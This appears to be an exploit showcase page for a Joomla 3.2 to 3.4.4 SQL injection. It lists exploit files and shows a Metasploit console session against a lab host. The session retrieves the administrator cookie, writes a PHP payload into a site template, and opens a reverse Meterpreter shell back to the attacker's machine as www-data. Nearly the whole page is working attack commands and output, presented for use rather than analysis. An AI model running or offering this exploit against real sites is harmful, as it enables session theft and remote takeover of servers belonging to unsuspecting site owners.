<strong><h1><center>Joomla! 3.2 to 3.4.4 - SQL Injection</strong></center></h1><br><br>
<br> <h3>expl.php</h3><br>
![alt tag](http://www14.0zz0.com/2015/10/27/21/401031393.jpg)<br><br><h3>Checker.pl</h3><br>
![alt tag](http://store1.up-00.com/2015-10/1446040259611.png)<br><br><h3>joomla_contenthistory_sqli.rb</h3><br>
<code>
msf > use exploit/unix/webapp/joomla_contenthistory_sqli_rce
msf exploit(joomla_contenthistory_sqli_rce) > set RHOST 192.168.2.130
RHOST => 192.168.2.130
msf exploit(joomla_contenthistory_sqli_rce) > exploit

[*] Started reverse handler on 192.168.2.50:4444
[*] 192.168.2.130:80 - Retrieved table prefix [ n13xt ]
[*] 192.168.2.130:80 - Retrieved admin cookie [ lvhjcpr08827qa2g45l537ct67 ]
[*] 192.168.2.130:80 - Retrieved unauthenticated cookie [ 8ec83d68fe7891e981f2e286f15b31d3 ]
[*] 192.168.2.130:80 - Successfully authenticated as Administrator
[*] 192.168.2.130:80 - Creating file [ b6iu7Dy.php ]
[*] 192.168.2.130:80 - Following redirect to [ /administrator/index.php?option=com_templates&view=template&id=503&file=L2I2aXU3RHkucGhw ]
[*] 192.168.2.130:80 - Token [ b062c55811a959dd9cd0f209311cecdb ] retrieved
[*] 192.168.2.130:80 - Template path [ /templates/beez3/ ] retrieved
[*] 192.168.2.130:80 - Insert payload into file [ b6iu7Dy.php ]
[*] 192.168.2.130:80 - Payload data inserted into [ b6iu7Dy.php ]
[*] 192.168.2.130:80 - Executing payload
[*] Sending stage (33068 bytes) to 192.168.2.130
[*] Meterpreter session 1 opened (192.168.2.50:4444 -> 192.168.2.130:46526) at 2015-10-23 16:55:26 +0700
[+] Deleted b6iu7Dy.php

meterpreter > getuid
Server username: www-data (33)
</code>
 
